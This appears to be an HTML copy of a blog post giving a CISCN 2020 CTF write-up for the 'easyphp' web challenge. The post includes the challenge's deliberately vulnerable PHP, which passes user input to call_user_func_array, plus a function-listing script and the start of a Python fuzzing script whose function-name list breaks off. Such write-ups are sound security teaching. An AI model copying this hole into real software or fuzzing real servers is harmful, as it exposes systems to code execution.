@@ -1,0 +1,1688 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>【CISCN 2020初赛】writeup web部分 - DumKiy's blog</title>
+
+<meta name="description" content="CISCN2020初赛 writeup web部分web1：easyphp&lt;?php    //题目环境：php:7.4.8-apache    $pid = pcntl_fork();    if ($pid == -1) {        die('could not fork');    }else ...">
+<link rel="canonical" href="http://localhost:4000/ctf/2020/08/26/CISCN-2020%E5%88%9D%E8%B5%9B-writeup-web%E9%83%A8%E5%88%86.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3,h4'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
+ preserveAspectRatio="xMidYMid meet">
+<metadata>
+Created by potrace 1.14, written by Peter Selinger 2001-2017
+</metadata>
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
+l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
+1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
+-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
+6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
+10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
+-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
+-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
+684 10 1799 11 l1755 0 57 -23z"/>
+<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
+-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
+215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
+918 -31 16 -53 17 -87 3z"/>
+<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
+37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
+</g>
+</svg>
+<a title="Watch And Learn
+" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>【CISCN 2020初赛】writeup web部分</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2020-08-25-CISCN-2020初赛-writeup-web部分.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="【CISCN 2020初赛】writeup web部分"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=rce">rce</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=unserialize">unserialize</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=prototype-pollution">prototype-pollution</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=float-number">float-number</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Aug 26, 2020</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2020-08-26T00:20:23+08:00">
+    <meta itemprop="keywords" content="rce,unserialize,prototype-pollution,float-number"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><h1 id="ciscn2020初赛-writeup-web部分">CISCN2020初赛 writeup web部分</h1>
+
+<h2 id="web1easyphp">web1：easyphp</h2>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+    <span class="c1">//题目环境：php:7.4.8-apache</span>
+    <span class="nv">$pid</span> <span class="o">=</span> <span class="nb">pcntl_fork</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">'could not fork'</span><span class="p">);</span>
+    <span class="p">}</span><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">){</span>
+        <span class="nv">$r</span><span class="o">=</span><span class="nb">pcntl_wait</span><span class="p">(</span><span class="nv">$status</span><span class="p">);</span> <span class="c1">//父进程等待子进程退出才会执行下面</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">pcntl_wifexited</span><span class="p">(</span><span class="nv">$status</span><span class="p">)){</span>
+            <span class="nb">phpinfo</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[:</span><span class="se">\\\\</span><span class="s2">]|exec|pcntl/i"</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">])){</span>
+            <span class="nb">call_user_func_array</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">],[</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'b'</span><span class="p">],</span><span class="kc">false</span><span class="p">,</span><span class="kc">true</span><span class="p">]);</span>
+        <span class="p">}</span>
+        <span class="nb">posix_kill</span><span class="p">(</span><span class="nb">posix_getpid</span><span class="p">(),</span> <span class="no">SIGUSR1</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>call_user_func_array</strong></p>
+
+<p>mixed call_user_func_array ( callable $callback , array $param_arr ) 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p>
+
+<p>这里需要一个函数接收三个参数</p>
+
+<p><strong>posix_kill</strong>(posix_getpid(), SIGUSR1);</p>
+
+<ul>
+  <li><strong>posix_getpid</strong> 取得当前服务器进程号</li>
+  <li>许多程序使用<strong>SIGUSR1</strong>在线程和进程间进行同步</li>
+</ul>
+
+<p><strong>pcntl_wait</strong>($status);</p>
+
+<ul>
+  <li>父进程等待子进程退出才会执行下面</li>
+</ul>
+
+<p><strong>pcntl_wifexited</strong> 进程控制函数</p>
+
+<ul>
+  <li>检查状态代码是否代表一个正常的退出。</li>
+  <li>参数 status 是提供给成功调用 <a href="https://www.jc2182.com/php-pcntl-waitpid-ref/5106.html">pcntl_waitpid()</a> 时的状态参数。</li>
+  <li>正常退出时为true，其他情况返回 FALSE。</li>
+  <li>这里看到phpinfo需要非正常情况退出</li>
+</ul>
+
+<h3 id="思路">思路</h3>
+
+<ul>
+  <li>猜测flag在phpinfo中，所以只需要让子进程错误退出即可继续执行父进程调用phpinfo</li>
+  <li>由于是调用函数，函数名可控，我们可以直接使用函数名进行fuzz。</li>
+</ul>
+
+<h3 id="payload">payload</h3>
+
+<p>获取php内置函数名</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">//题目环境：php:7.4.8-apache</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+<span class="k">foreach</span> <span class="p">(</span><span class="nb">get_defined_functions</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$key</span> <span class="o">==</span> <span class="s1">'internal'</span><span class="p">){</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$val</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">){</span>
+            <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$result</span><span class="mf">.</span><span class="nv">$v</span><span class="mf">.</span><span class="s2">" "</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="nv">$result</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s2">"func_name.txt"</span><span class="p">)){</span>
+    <span class="nb">unlink</span><span class="p">(</span><span class="s2">"func_name.txt"</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"func_name.txt"</span><span class="p">,</span><span class="nv">$result</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>发包脚本</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#coding=utf-8
+</span><span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
+zend_version func_num_args func_get_arg func_get_args strlen strcmp strncmp strcasecmp strncasecmp each error_reporting define defined get_class get_called_class get_parent_class method_exists property_exists class_exists interface_exists trait_exists function_exists class_alias get_included_files get_required_files is_subclass_of is_a get_class_vars get_object_vars get_class_methods trigger_error user_error set_error_handler restore_error_handler set_exception_handler restore_exception_handler get_declared_classes get_declared_traits get_declared_interfaces get_defined_functions get_defined_vars create_function get_resource_type get_loaded_extensions extension_loaded get_extension_funcs get_defined_constants debug_backtrace debug_print_backtrace gc_collect_cycles gc_enabled gc_enable gc_disable bcadd bcsub bcmul bcdiv bcmod bcpow bcsqrt bcscale bccomp bcpowmod jdtogregorian gregoriantojd jdtojulian juliantojd jdtojewish jewishtojd jdtofrench frenchtojd jddayofweek jdmonthname easter_date easter_days unixtojd jdtounix cal_to_jd cal_from_jd cal_days_in_month cal_info ctype_alnum ctype_alpha ctype_cntrl ctype_digit ctype_lower ctype_graph ctype_print ctype_punct ctype_space ctype_upper ctype_xdigit strtotime date idate gmdate mktime gmmktime checkdate strftime gmstrftime time localtime getdate date_create date_create_immutable date_create_from_format date_create_immutable_from_format date_parse date_parse_from_format date_get_last_errors date_format date_modify date_add date_sub date_timezone_get date_timezone_set date_offset_get date_diff date_time_set date_date_set date_isodate_set date_timestamp_set date_timestamp_get timezone_open timezone_name_get timezone_name_from_abbr timezone_offset_get timezone_transitions_get timezone_location_get timezone_identifiers_list timezone_abbreviations_list timezone_version_get date_interval_create_from_date_string date_interval_format date_default_timezone_set date_default_timezone_get date_sunrise date_sunset date_sun_info ereg ereg_replace eregi eregi_replace split spliti sql_regcase filter_input filter_var filter_input_array filter_var_array filter_list filter_has_var filter_id ftp_connect ftp_login ftp_pwd ftp_cdup ftp_chdir ftp_exec ftp_raw ftp_mkdir ftp_rmdir ftp_chmod ftp_alloc ftp_nlist ftp_rawlist ftp_systype ftp_pasv ftp_get ftp_fget ftp_put ftp_fput ftp_size ftp_mdtm ftp_rename ftp_delete ftp_site ftp_close ftp_set_option ftp_get_option ftp_nb_fget ftp_nb_get ftp_nb_continue ftp_nb_put ftp_nb_fput ftp_quit hash hash_file hash_hmac hash_hmac_file hash_init hash_update hash_update_stream hash_update_file hash_final hash_copy hash_algos hash_pbkdf2 mhash_keygen_s2k mhash_get_block_size mhash_get_hash_name mhash_count mhash iconv iconv_get_encoding iconv_set_encoding iconv_strlen iconv_substr iconv_strpos iconv_strrpos iconv_mime_encode iconv_mime_decode iconv_mime_decode_headers json_encode json_decode json_last_error json_last_error_msg mcrypt_ecb mcrypt_cbc mcrypt_cfb mcrypt_ofb mcrypt_get_key_size mcrypt_get_block_size mcrypt_get_cipher_name mcrypt_create_iv mcrypt_list_algorithms mcrypt_list_modes mcrypt_get_iv_size mcrypt_encrypt mcrypt_decrypt mcrypt_module_open mcrypt_generic_init mcrypt_generic mdecrypt_generic mcrypt_generic_end mcrypt_generic_deinit mcrypt_enc_self_test mcrypt_enc_is_block_algorithm_mode mcrypt_enc_is_block_algorithm mcrypt_enc_is_block_mode mcrypt_enc_get_block_size mcrypt_enc_get_key_size mcrypt_enc_get_supported_key_sizes mcrypt_enc_get_iv_size mcrypt_enc_get_algorithms_name mcrypt_enc_get_modes_name mcrypt_module_self_test mcrypt_module_is_block_algorithm_mode mcrypt_module_is_block_algorithm mcrypt_module_is_block_mode mcrypt_module_get_algo_block_size mcrypt_module_get_algo_key_size mcrypt_module_get_supported_key_sizes mcrypt_module_close odbc_autocommit odbc_binmode odbc_close odbc_close_all odbc_columns odbc_commit odbc_connect odbc_cursor odbc_data_source odbc_execute odbc_error odbc_errormsg odbc_exec odbc_fetch_array odbc_fetch_object odbc_fetch_row odbc_fetch_into odbc_field_len odbc_field_scale odbc_field_name odbc_field_type odbc_field_num odbc_free_result odbc_gettypeinfo odbc_longreadlen odbc_next_result odbc_num_fields odbc_num_rows odbc_pconnect odbc_prepare odbc_result odbc_result_all odbc_rollback odbc_setoption odbc_specialcolumns odbc_statistics odbc_tables odbc_primarykeys odbc_columnprivileges odbc_tableprivileges odbc_foreignkeys odbc_procedures odbc_procedurecolumns odbc_do odbc_field_precision preg_match preg_match_all preg_replace preg_replace_callback preg_filter preg_split preg_quote preg_grep preg_last_error session_name session_module_name session_save_path session_id session_regenerate_id session_decode session_encode session_start session_destroy session_unset session_set_save_handler session_cache_limiter session_cache_expire session_set_cookie_params session_get_cookie_params session_write_close session_status session_register_shutdown session_commit spl_classes spl_autoload spl_autoload_extensions spl_autoload_register spl_autoload_unregister spl_autoload_functions spl_autoload_call class_parents class_implements class_uses spl_object_hash iterator_to_array iterator_count iterator_apply constant bin2hex hex2bin sleep usleep time_nanosleep time_sleep_until flush wordwrap htmlspecialchars htmlentities html_entity_decode htmlspecialchars_decode get_html_translation_table sha1 sha1_file md5 md5_file crc32 iptcparse iptcembed getimagesize getimagesizefromstring image_type_to_mime_type image_type_to_extension phpinfo phpversion phpcredits php_sapi_name php_uname php_ini_scanned_files php_ini_loaded_file strnatcmp strnatcasecmp substr_count strspn strcspn strtok strtoupper strtolower strpos stripos strrpos strripos strrev hebrev hebrevc nl2br basename dirname pathinfo stripslashes stripcslashes strstr stristr strrchr str_shuffle str_word_count str_split strpbrk substr_compare strcoll substr substr_replace quotemeta ucfirst lcfirst ucwords strtr addslashes addcslashes rtrim str_replace str_ireplace str_repeat count_chars chunk_split trim ltrim strip_tags similar_text explode implode join setlocale localeconv soundex levenshtein chr ord parse_str str_getcsv str_pad chop strchr sprintf printf vprintf vsprintf fprintf vfprintf sscanf fscanf parse_url urlencode urldecode rawurlencode rawurldecode http_build_query readlink linkinfo symlink link unlink exec system escapeshellcmd escapeshellarg passthru shell_exec proc_open proc_close proc_terminate proc_get_status rand srand getrandmax mt_rand mt_srand mt_getrandmax getservbyname getservbyport getprotobyname getprotobynumber getmyuid getmygid getmypid getmyinode getlastmod base64_decode base64_encode password_hash password_get_info password_needs_rehash password_verify convert_uuencode convert_uudecode abs ceil floor round sin cos tan asin acos atan atanh atan2 sinh cosh tanh asinh acosh expm1 log1p pi is_finite is_nan is_infinite pow exp log log10 sqrt hypot deg2rad rad2deg bindec hexdec octdec decbin decoct dechex base_convert number_format fmod inet_ntop inet_pton ip2long long2ip getenv putenv getopt microtime gettimeofday uniqid quoted_printable_decode quoted_printable_encode convert_cyr_string get_current_user set_time_limit header_register_callback get_cfg_var magic_quotes_runtime set_magic_quotes_runtime get_magic_quotes_gpc get_magic_quotes_runtime error_log error_get_last call_user_func call_user_func_array call_user_method call_user_method_array forward_static_call forward_static_call_array serialize unserialize var_dump var_export debug_zval_dump print_r memory_get_usage memory_get_peak_usage register_shutdown_function register_tick_function unregister_tick_function highlight_file show_source highlight_string php_strip_whitespace ini_get ini_get_all ini_set ini_alter ini_restore get_include_path set_include_path restore_include_path setcookie setrawcookie header header_remove headers_sent headers_list http_response_code connection_aborted connection_status ignore_user_abort parse_ini_file parse_ini_string is_uploaded_file move_uploaded_file gethostbyaddr gethostbyname gethostbynamel gethostname dns_check_record checkdnsrr dns_get_mx getmxrr dns_get_record intval floatval doubleval strval boolval gettype settype is_null is_resource is_bool is_long is_float is_int is_integer is_double is_real is_numeric is_string is_array is_object is_scalar is_callable pclose popen readfile rewind rmdir umask fclose feof fgetc fgets fgetss fread fopen fpassthru ftruncate fstat fseek ftell fflush fwrite fputs mkdir rename copy tempnam tmpfile file file_get_contents file_put_contents stream_select stream_context_create stream_context_set_params stream_context_get_params stream_context_set_option stream_context_get_options stream_context_get_default stream_context_set_default stream_filter_prepend stream_filter_append stream_filter_remove stream_socket_client stream_socket_server stream_socket_accept stream_socket_get_name stream_socket_recvfrom stream_socket_sendto stream_socket_enable_crypto stream_socket_shutdown stream_socket_pair stream_copy_to_stream stream_get_contents stream_supports_lock fgetcsv fputcsv flock get_meta_tags stream_set_read_buffer stream_set_write_buffer set_file_buffer stream_set_chunk_size set_socket_blocking stream_set_blocking socket_set_blocking stream_get_meta_data stream_get_line stream_wrapper_register stream_register_wrapper stream_wrapper_unregister stream_wrapper_restore stream_get_wrappers stream_get_transports stream_resolve_include_path stream_is_local get_headers stream_set_timeout socket_set_timeout socket_get_status realpath fnmatch fsockopen pfsockopen pack unpack get_browser crypt opendir closedir chdir getcwd rewinddir readdir dir scandir glob fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype file_exists is_writable is_writeable is_readable is_executable is_file is_dir is_link stat lstat chown chgrp chmod touch clearstatcache disk_total_space disk_free_space diskfreespace realpath_cache_size realpath_cache_get mail ezmlm_hash openlog syslog closelog lcg_value metaphone ob_start ob_flush ob_clean ob_end_flush ob_end_clean ob_get_flush ob_get_clean ob_get_length ob_get_level ob_get_status ob_get_contents ob_implicit_flush ob_list_handlers ksort krsort natsort natcasesort asort arsort sort rsort usort uasort uksort shuffle array_walk array_walk_recursive count end prev next reset current key min max in_array array_search extract compact array_fill array_fill_keys range array_multisort array_push array_pop array_shift array_unshift array_splice array_slice array_merge array_merge_recursive array_replace array_replace_recursive array_keys array_values array_count_values array_column array_reverse array_reduce array_pad array_flip array_change_key_case array_rand array_unique array_intersect array_intersect_key array_intersect_ukey array_uintersect array_intersect_assoc array_uintersect_assoc array_intersect_uassoc array_uintersect_uassoc array_diff array_diff_key array_diff_ukey array_udiff array_diff_assoc array_udiff_assoc array_diff_uassoc array_udiff_uassoc array_sum array_product array_filter array_map array_chunk array_combine array_key_exists pos sizeof key_exists assert assert_options version_compare str_rot13 stream_get_filters stream_filter_register stream_bucket_make_writeable stream_bucket_prepend stream_bucket_append stream_bucket_new output_add_rewrite_var output_reset_rewrite_vars sys_get_temp_dir token_get_all token_name zip_open zip_close zip_read zip_entry_open zip_entry_close zip_entry_read zip_entry_filesize zip_entry_name zip_entry_compressedsize zip_entry_compressionmethod readgzfile gzrewind gzclose gzeof gzgetc gzgets gzgetss gzread gzopen gzpassthru gzseek gztell gzwrite gzputs gzfile gzcompress gzuncompress gzdeflate gzinflate gzencode gzdecode zlib_encode zlib_decode zlib_get_coding_type ob_gzhandler libxml_set_streams_context libxml_use_internal_errors libxml_get_last_error libxml_clear_errors libxml_get_errors libxml_disable_entity_loader libxml_set_external_entity_loader dom_import_simplexml pdo_drivers simplexml_load_file simplexml_load_string simplexml_import_dom wddx_serialize_value wddx_serialize_vars wddx_packet_start wddx_packet_end wddx_add_vars wddx_deserialize xml_parser_create xml_parser_create_ns xml_set_object xml_set_element_handler xml_set_character_data_handler xml_set_processing_instruction_handler xml_set_default_handler xml_set_unparsed_entity_decl_handler xml_set_notation_decl_handler xml_set_external_entity_ref_handler xml_set_start_namespace_decl_handler xml_set_end_namespace_decl_handler xml_parse xml_parse_into_struct xml_get_error_code xml_error_string xml_get_current_line_number xml_get_current_column_number xml_get_current_byte_index xml_parser_free xml_parser_set_option xml_parser_get_option utf8_encode utf8_decode xmlwriter_open_uri xmlwriter_open_memory xmlwriter_set_indent xmlwriter_set_indent_string xmlwriter_start_comment xmlwriter_end_comment xmlwriter_start_attribute xmlwriter_end_attribute xmlwriter_write_attribute xmlwriter_start_attribute_ns xmlwriter_write_attribute_ns xmlwriter_start_element xmlwriter_end_element xmlwriter_full_end_element xmlwriter_start_element_ns xmlwriter_write_element xmlwriter_write_element_ns xmlwriter_start_pi xmlwriter_end_pi xmlwriter_write_pi xmlwriter_start_cdata xmlwriter_end_cdata xmlwriter_write_cdata xmlwriter_text xmlwriter_write_raw xmlwriter_start_document xmlwriter_end_document xmlwriter_write_comment xmlwriter_start_dtd xmlwriter_end_dtd xmlwriter_write_dtd xmlwriter_start_dtd_element xmlwriter_end_dtd_element xmlwriter_write_dtd_element xmlwriter_start_dtd_attlist xmlwriter_end_dtd_attlist xmlwriter_write_dtd_attlist xmlwriter_start_dtd_entity xmlwriter_end_dtd_entity xmlwriter_write_dtd_entity xmlwriter_output_memory xmlwriter_flush bzopen bzread bzwrite bzflush bzclose bzerrno bzerrstr bzerror bzcompress bzdecompress curl_init curl_copy_handle curl_version curl_setopt curl_setopt_array curl_exec curl_getinfo curl_error curl_errno curl_close curl_strerror 